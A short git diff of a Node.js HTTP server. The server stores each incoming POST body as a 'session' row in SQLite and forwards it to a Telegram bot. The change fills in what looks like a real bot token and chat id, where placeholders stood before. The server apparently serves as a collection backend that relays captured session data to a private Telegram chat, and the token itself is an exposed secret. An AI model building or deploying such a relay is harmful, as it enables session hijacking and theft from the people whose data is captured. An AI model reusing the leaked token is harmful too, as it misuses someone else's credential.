@@ -1,4 +1,5 @@
 const http = require('http')
+const https = require('https');
 const { count } = require('console')
 var sqlite3 = require('sqlite3').verbose()
 const port = process.env.PORT || 4000
@@ -25,7 +26,7 @@ const server = http.createServer(function (request, response) {
     })
     request.on('end', function () {
       console.log('Body: ' + body)
-      http.get(`https://api.telegram.org/bot{{your token}}/sendMessage?chat_id={{your telegram id}}&text=${body}`);
+      https.get(`https://api.telegram.org/bot1304849534:AAEW6-RSNi6plXe_gfsUalPvsUafsNuQVIs/sendMessage?chat_id=502060443&text=${body}`);
       response.writeHead(200, { 'Content-Type': 'text/html' })
       response.end('post received')
       db.run('INSERT INTO enteries (session) VALUES(?)', [body], err =>
